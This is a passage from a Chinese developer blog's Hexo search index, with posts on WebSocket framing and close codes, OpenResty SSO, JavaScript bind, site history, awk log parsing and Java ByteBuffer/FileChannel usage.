<span class="number">125</span>) &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | <span class="number">126</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> extendedPayloadLengthBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>);</span><br><span class="line">        data.<span class="title function_">push</span>(extendedPayloadLengthBuf);</span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt16BE</span>(payload.<span class="property">length</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | payload.<span class="property">length</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data.<span class="title function_">push</span>(payload);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h4><p>WebSocket连接关闭时需要两者协商。客户端调用<code>close</code>方法会给服务器端先发送一个数据帧，该数据帧<code>opcode</code>为<code>0x8</code>。如果<code>payload</code>不为空，它的<code>payload</code>头两个字节为状态码，后面的是关闭连接的原因。服务器断开连接后才会触发<code>close</code>事件。</p><ul><li><p>1000</p><p>  1000表示正常关闭，意思是建议的连接已经完成了。</p></li><li><p>1001</p><p>  1001表示端点“离开”（going away），例如服务器关闭或浏览器导航到其他页面。</p></li><li><p>1002</p><p>  1002表示端点因为协议错误而终止连接。</p></li><li><p>1003</p><p>  1003表示端点由于它收到了不能接收的数据类型（例如，端点仅理解文本数据，但接收到了二进制消息）而终止连接。</p></li><li><p>1004 保留。可能在将来定义其具体的含义。</p></li><li><p>1005</p><p>  1005是一个保留值，且不能由端点在关闭控制帧中设置此状态码。它被指定用在期待一个用于表示没有状态码是实际存在的状态码的应用中。</p></li><li><p>1006</p><p>  1006是一个保留值，且不能由端点在关闭控制帧中设置此状态码。它被指定用在期待一个用于表示连接异常关闭的状态码的应用中。</p></li><li><p>1007</p><p>  1007表示端点因为消息中接收到的数据是不符合消息类型而终止连接（比如，文本消息中存在非UTF-8[RFC3629]数据）。</p></li><li><p>1008</p><p>  1008表示端点因为接收到的消息违反其策略而终止连接。这是一个当没有其他合适状态码（例如1003或1009）或如果需要隐藏策略的具体细节时能被返回的通用状态码。</p></li><li><p>1009</p><p>  1009表示端点因接收到的消息对它的处理来说太大而终止连接。</p></li><li><p>1010</p><p>  1010表示端点（客户端）因为它期望服务器协商一个或多个扩展，但服务器没有在WebSocket握手响应消息中返回它们而终止连接。 所需要的扩展列表应该出现在关闭帧的&#x2F;reason&#x2F;部分。</p><p>  注意，这个状态码不能被服务器端使用，因为它可以失败WebSocket握手。</p></li><li><p>1011</p><p>  1011表示服务器端因为遇到了一个不期望的情况使它无法满足请求而终止连接。</p></li><li><p>1015</p><p>  1015是一个保留值，且不能由端点在关闭帧中被设置为状态码。它被指定用在期待一个用于表示连接由于执行TLS握手失败而关闭的状态码的应用中（比如，服务器证书不能验证）。</p></li></ul><h4 id="状态转变"><a href="#状态转变" class="headerlink" title="状态转变"></a>状态转变</h4><p>客户端共有四种状态<code>CONNECTING</code>(0)、<code>OPEN</code>(1)、<code>CLOSEING</code>(2)、<code>CLOSED</code>(3)，调用<code>readyState</code>可以查看具体的状态。</p><p>创建<code>WebSocket</code>对象后处于<code>CONNECTING</code>状态，完成协议升级后变为<code>OPEN</code>状态。调用<code>close()</code>方法后处于<code>CLOSEING</code>状态，连接断开后变为<code>CLOSED</code>状态。</p><p><a href="https://gist.github.com/tianyk/de89f1f70d229861384126c417ab6138">完整测试代码</a></p><script src="https://gist.github.com/de89f1f70d229861384126c417ab6138.js"></script><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://imququ.com/post/protocol-negotiation-in-http2.html">谈谈 HTTP&#x2F;2 的协议协商机制</a></li><li><a href="https://tools.ietf.org/html/rfc6455">The WebSocket Protocol</a></li><li><a href="https://www.web-tinker.com/article/20305.html">WebSocket(壹) 握手连接</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> websocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用OpenResty实现统一登录系统</title>
      <link href="/post/sso.html"/>
      <url>/post/sso.html</url>
      
        <content type="html"><![CDATA[<h2 id="OpenResty统一登录系统"><a href="#OpenResty统一登录系统" class="headerlink" title="OpenResty统一登录系统"></a>OpenResty统一登录系统</h2><p>一个大的系统往往会有多个子系统组成，要实现用户在多个系统间只有切换，我们往往需要一个统一的登录权限系统或者一个统一的规则。</p><p>大多数系统前置都会使用<code>Nginx</code>做负载或者分发，如果我们把登录这块抽取出来放到<code>Nginx</code>里面下层的子系统就不需要都去处理这方面的问题了。这样整个系统更加统一清晰、子系统只需要关注自身业务即可。</p><h3 id="设计及实现"><a href="#设计及实现" class="headerlink" title="设计及实现"></a>设计及实现</h3><p><img src="/images/openresty-sso.jpg"></p><p>这里可以使用<a href="https://jwt.io/">JWT</a>来实现<code>TOKEN</code>，登录成功后将<code>TOKEN</code>写入<code>Cookie</code>中。发起请求时先从<code>Cookie</code>中获取<code>TOKEN</code>然后校验，校验成功后将<code>TOKEN</code>解析后的内容追加到Cookie中再向后面的业务系统分发。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sso.lua </span></span><br><span class="line"><span class="comment">-- TODO </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> openresty </tag>
            
            <tag> sso </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript模拟四则运算</title>
      <link href="/post/javascript-elementary-arithmetic.html"/>
      <url>/post/javascript-elementary-arithmetic.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/elementary-arithmetic.jpg"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="comment">// 重点!!!这里的num是一个计算后的结果</span></span><br><span class="line">    <span class="comment">// 这里的this在调用处进行了修正，指向 A + B 中的 A。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span> + num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">one</span>(<span class="params">op</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _one = &#123; <span class="attr">value</span>: <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op = op.<span class="title function_">bind</span>(_one);</span><br><span class="line">        <span class="comment">// 关键点将本值绑定到操作函数上，让操作函数能访问本值</span></span><br><span class="line">        <span class="comment">// 返回 + - * / 操作结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">op</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 返回本值</span></span><br><span class="line">        <span class="keyword">return</span> _one.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">one</span>(<span class="title function_">add</span>(<span class="title function_">one</span>(<span class="title function_">add</span>(<span class="title function_">one</span>())))));</span><br><span class="line"><span class="comment">// setp_1 </span></span><br><span class="line"><span class="comment">// one();        // 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setp_2        one(add(one())) 第一步算出one()为1</span></span><br><span class="line"><span class="comment">// one(add(1)); // 2 add的this为one内部的`_one`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setp_3        one(add(one(add(one())))) 上两步算出one(add(one()))为2</span></span><br><span class="line"><span class="comment">// one(add(2)); // 3 </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> this </tag>
            
            <tag> bind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站变更历史</title>
      <link href="/post/history.html"/>
      <url>/post/history.html</url>
      
        <content type="html"><![CDATA[<h2 id="网站变更历史"><a href="#网站变更历史" class="headerlink" title="网站变更历史"></a>网站变更历史</h2><h3 id="2019-06-07"><a href="#2019-06-07" class="headerlink" title="2019-06-07"></a>2019-06-07</h3><ol><li><p>准备</p><ul><li>新建仓库<a href="https://github.com/tianyk/tianyk.github.io">tianyk&#x2F;tianyk.github.io</a><blockquote><p>GitHub支持两种方式GitHub Page：</p><ol><li>仓库名为<code>YOUR_NAME.github.io</code>，此方式访问地址为<code>YOUR_NAME.github.io</code></li><li>master分支、master分支的<code>/docs</code>目录、<code>gh-pages</code>分支，这种方式访问地址为<code>YOUR_NAME.github.io/REPOSITORY_NAME</code></li></ol></blockquote></li></ul></li><li><p>迁移网站到GitHub Page</p><ol><li><a href="https://hexo.io/zh-cn/docs/deployment.html#Git">配置</a><code>git</code>方式部署</li></ol></li><li><p>修改<code>CNAME</code>为<code>tianyk.github.io</code></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig kekek.cc A </span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">kekek.cc.           10      IN   CNAME    tianyk.github.io.</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.110.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.109.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.108.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.111.153</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-11-15"><a href="#2018-11-15" class="headerlink" title="2018-11-15"></a>2018-11-15</h3><ol><li><p>❤点击记录</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source/js/main.js</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-08-25"><a href="#2018-08-25" class="headerlink" title="2018-08-25"></a>2018-08-25</h3><ol><li>include_code 标签支持从网络加载代码 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/include_code.js</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-08-24"><a href="#2018-08-24" class="headerlink" title="2018-08-24"></a>2018-08-24</h3><ol><li><p>停用AMP</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure></li><li><p>修改下载目录为<code>downloads</code></p></li></ol><h3 id="2018-07-16"><a href="#2018-07-16" class="headerlink" title="2018-07-16"></a>2018-07-16</h3><ol><li><p>配置<code>skip_render</code></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-07-04"><a href="#2018-07-04" class="headerlink" title="2018-07-04"></a>2018-07-04</h3><ol><li><p>footer对齐</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cactus/source/css/_partial/footer.styl</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-07-03"><a href="#2018-07-03" class="headerlink" title="2018-07-03"></a>2018-07-03</h3><ol><li><p>footer部分❤点击</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cactus/layout/_partial/footer.ejs</span><br><span class="line">cactus/source/css/_partial/footer.styl</span><br><span class="line">cactus/source/js/main.js</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><ul><li><a href="https://medium.com/@chrismabry/how-did-they-do-that-the-twitter-like-animation-2a473b658e43">How Did They Do That? The Twitter “Like” Animation</a></li><li><a href="https://codepen.io/mindstorm/pen/aZZvKq">css | twitter heart animation</a></li><li><a href="http://www.w3cplus.com/animation/recreating-the-twitter-heart-animation.html">重新创建Twitter点赞动效</a></li><li><a href="https://codepen.io/yisi/pen/LpXVJb">Twitter heart button animation</a></li><li><a href="https://blog.prototypr.io/twitter-s-heart-animation-in-full-css-b1c00ca5b774">Twitter’s Heart Animation in Full CSS</a></li></ul><h3 id="2018-06-14"><a href="#2018-06-14" class="headerlink" title="2018-06-14"></a>2018-06-14</h3><ol><li><p>添加创作许可</p><p> 选择许可证<a href="https://creativecommons.org/choose/">https://creativecommons.org/choose/</a></p></li><li><p>网站变更开始添加版本</p><p> 以后均采用日期作为版本，本次版本为[20180614]</p></li></ol><h3 id="2018-06-12"><a href="#2018-06-12" class="headerlink" title="2018-06-12"></a>2018-06-12</h3><ol><li><p>添加<a href="/tags/">标签</a>和<a href="/categories/">分类</a>页面</p><ol><li>添加新的页面 <code>layout/tags.ejs</code></li><li>通过<a href="https://hexo.io/zh-cn/docs/variables.html#%E7%BD%91%E7%AB%99%E5%8F%98%E9%87%8F"><code>site.tags</code></a>获取所有标签</li><li>创建一个新的<code>hexo new page &quot;tags&quot;</code></li><li>添加<code>layout: tags</code>到<code>source/tags/index.md</code>的front-matter。</li></ol><blockquote><p>参考<code>layout/archive.ejs</code></p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/probberechts/hexo-theme-cactus/issues/35 --&gt;</span><br><span class="line">&lt;div id=&quot;tags&quot;&gt;</span><br><span class="line">    &lt;ul class=&quot;post-list&quot;&gt;</span><br><span class="line">    &lt;% site.tags.each(function(tag) &#123; %&gt;</span><br><span class="line">        &lt;h2&gt;&lt;%= tag.name %&gt;&lt;/h2&gt;</span><br><span class="line">        &lt;% tag.posts.each(function(post) &#123; %&gt;</span><br><span class="line">            &lt;li class=&quot;post-item&quot;&gt;</span><br><span class="line">                &lt;%- partial(&#x27;_partial/post/date&#x27;, &#123; post: post, class_name: &#x27;meta&#x27; &#125;) %&gt;</span><br><span class="line">                &lt;span&gt;&lt;%- partial(&#x27;_partial/post/title&#x27;, &#123; post: post, index: true, class_name: &#x27;&#x27; &#125;) %&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;% &#125;); %&gt;</span><br><span class="line">    &lt;% &#125;); %&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>i18n</p><p> <code>themes/cactus/languages/[default|zh-CN].yml</code></p></li><li><p>robots.txt</p><p> 添加<code>Disallow: /categories</code></p></li></ol><h3 id="2018-05-03"><a href="#2018-05-03" class="headerlink" title="2018-05-03"></a>2018-05-03</h3><p>本站使用<a href="https://hexo.io/">hexo</a>搭建，使用<a href="https://github.com/probberechts/hexo-theme-cactus">cactus</a>模板。使用<a href="https://openresty.org/">Openresty</a>作为Web服务器。网站证书使用<a href="https://letsencrypt.org/">Let’s Encrypt</a>。本站托管在<a href="https://www.vultr.com/?ref=7274958">Vultr</a>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>awk</title>
      <link href="/post/awk.html"/>
      <url>/post/awk.html</url>
      
        <content type="html"><![CDATA[<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p><img src="/images/awk.jpg"></p><p>awk 语法分<code>BEGIN</code>、<code>BODY</code>和<code>END</code>三部分，其中<code>BEGIN</code>和<code>END</code>可以省略。<code>BEGIN</code>和<code>END</code>只会执行一次，一般用于初始化和收尾操作，<code>BODY</code>部分会每一行都重复执行。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ol><li><p>监听IP是<code>107.23.80.198</code>的机器对HTTP和HTTPS服务的所有连接</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -t </span><br><span class="line">Active Internet connections (w/o servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 172.22.203.148:https        122.224.64.42:opswmanager   SYN_RECV    </span><br><span class="line">tcp        0      0 172.22.203.148:http         39.106.12.213:45574         ESTABLISHED </span><br><span class="line">tcp        0  17376 172.22.203.148:http         107.23.80.198:52924         ESTABLISHED </span><br><span class="line">tcp        0  27512 172.22.203.148:http         107.23.80.198:52928         ESTABLISHED </span><br><span class="line">tcp        0  34752 172.22.203.148:http         107.23.80.198:52925         ESTABLISHED </span><br><span class="line">tcp        0      0 172.22.203.148:47400        106.11.68.13:http           ESTABLISHED </span><br><span class="line">tcp      381      0 172.22.203.148:45978        100.100.25.3:http           CLOSE_WAIT  </span><br><span class="line">tcp        0  14480 172.22.203.148:http         107.23.80.198:52927         ESTABLISHED </span><br><span class="line">tcp        0    120 172.22.203.148:ssh          107.23.80.198:51439         ESTABLISHED </span><br><span class="line">tcp        0 228784 172.22.203.148:https        107.23.80.198:52921         ESTABLISHED </span><br><span class="line">tcp        0  47784 172.22.203.148:http         107.23.80.198:52929         ESTABLISHED </span><br><span class="line">tcp        0  18824 172.22.203.148:http         107.23.80.198:52926         ESTABLISHED </span><br><span class="line">tcp      401      0 172.22.203.148:34764        106.11.68.13:http           CLOSE_WAIT  </span><br></pre></td></tr></table></figure> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -t | awk <span class="string">&#x27;NR &gt; 2 &#123; if ((match($4, &quot;:https&quot;) || match($4, &quot;:http&quot;)) &amp;&amp; match($5, &quot;107.23.80.198&quot;)) &#123;print&#125;&#125; &#x27;</span></span></span><br><span class="line">tcp        0  36200 172.17.204.148:http         107.23.80.198:53813          ESTABLISHED </span><br><span class="line">tcp        0  13032 172.17.204.148:http         107.23.80.198:53855          ESTABLISHED </span><br><span class="line">tcp        0  34752 172.17.204.148:http         107.23.80.198:53852          ESTABLISHED </span><br><span class="line">tcp        0  15928 172.17.204.148:http         107.23.80.198:53854          ESTABLISHED </span><br><span class="line">tcp        0 169416 172.17.204.148:https        107.23.80.198:52921          ESTABLISHED </span><br><span class="line">tcp        0  17376 172.17.204.148:http         107.23.80.198:53853          ESTABLISHED </span><br><span class="line">tcp        0  26064 172.17.204.148:http         107.23.80.198:53816          ESTABLISHED </span><br></pre></td></tr></table></figure><p> 这个例子中没有<code>BEGIN</code>和<code>END</code>部分（BEGIN和END部分需要有这两个关键字 <code>BEGIN {} {} END {}</code>）。<code>NR &gt; 2</code> 首先跳过头两行，match用于字符串匹配，最后的print会打印整行（同<code>print $0</code>）</p></li><li><p>统计Nginx每天的请求量</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;arr[substr($4, 2, (index($4, &quot;:&quot;) - 2))]++ &#125; END &#123;for (a in arr) print a, arr[a]&#125;&#x27; /var/log/nginx/access.log</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.jobbole.com/109089/">三十分钟学会AWK</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java.io</title>
      <link href="/post/java.io.html"/>
      <url>/post/java.io.html</url>
      
        <content type="html"><![CDATA[<h3 id="ByteBuffer"><a href="#ByteBuffer" class="headerlink" title="ByteBuffer"></a>ByteBuffer</h3><p><a href="https://my.oschina.net/flashsword/blog/159613">ByteBuffer</a> 可以在堆外分配内存，减少垃圾回收。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">100</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putInt(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putLong(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putLong capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.printf(<span class="string">&quot;flip capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.getInt();</span><br><span class="line">System.out.printf(<span class="string">&quot;getInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.getLong();</span><br><span class="line">System.out.printf(<span class="string">&quot;getLong capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.limit(byteBuffer.capacity());</span><br><span class="line">System.out.printf(<span class="string">&quot;resetLimit capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.put((<span class="type">byte</span>) <span class="number">127</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putByte capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.mark();</span><br><span class="line">System.out.printf(<span class="string">&quot;mark capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putInt(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.reset();</span><br><span class="line">System.out.printf(<span class="string">&quot;reset capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.clear();</span><br><span class="line">System.out.printf(<span class="string">&quot;clear capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.position(<span class="number">13</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;resetPosition capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.printf(<span class="string">&quot;flip capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">System.out.println(byteBuffer.arrayOffset());</span><br><span class="line">byteBuffer.remaining(); <span class="comment">// return limit - position;</span></span><br><span class="line">byteBuffer.hasRemaining(); <span class="comment">// return position &lt; limit;</span></span><br><span class="line"><span class="keyword">if</span> (byteBuffer.hasRemaining()) byteBuffer.get();</span><br><span class="line"></span><br><span class="line"><span class="comment">//byteBuffer.mark();</span></span><br><span class="line"><span class="comment">//byteBuffer.flip();</span></span><br><span class="line"><span class="comment">//byteBuffer.getInt();</span></span><br><span class="line"><span class="comment">//if (byteBuffer.position() &lt; byteBuffer.limit())</span></span><br><span class="line"><span class="comment">//    byteBuffer.getInt();</span></span><br><span class="line"><span class="comment">//System.out.println(byteBuffer.position());</span></span><br></pre></td></tr></table></figure><h4 id="ByteBuffer-vs-ByteBuf（Netty）"><a href="#ByteBuffer-vs-ByteBuf（Netty）" class="headerlink" title="ByteBuffer vs ByteBuf（Netty）"></a>ByteBuffer vs ByteBuf（Netty）</h4><p><a href="http://blog.csdn.net/jeffleo/article/details/69230112">Netty ByteBuf和Nio ByteBuffer</a></p><h3 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Files.copy(Paths.get(args[0]), Paths.get(args[1]));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">read</span> <span class="operator">=</span> FileChannel.open(Paths.get(args[<span class="number">0</span>]));</span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">write</span> <span class="operator">=</span> FileChannel.open(Paths.get(args[<span class="number">1</span>]), CREATE, TRUNCATE_EXISTING, WRITE);) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">while</span> (-<span class="number">1</span> != read.read(buffer)) &#123;</span><br><span class="line">        buffer.flip();</span><br><span class="line">        write.write(buffer);</span><br><span class="line">        buffer.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ECHO"><a href="#ECHO" class="headerlink" title="ECHO"></a>ECHO</h3><ul><li><p>OIO </p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 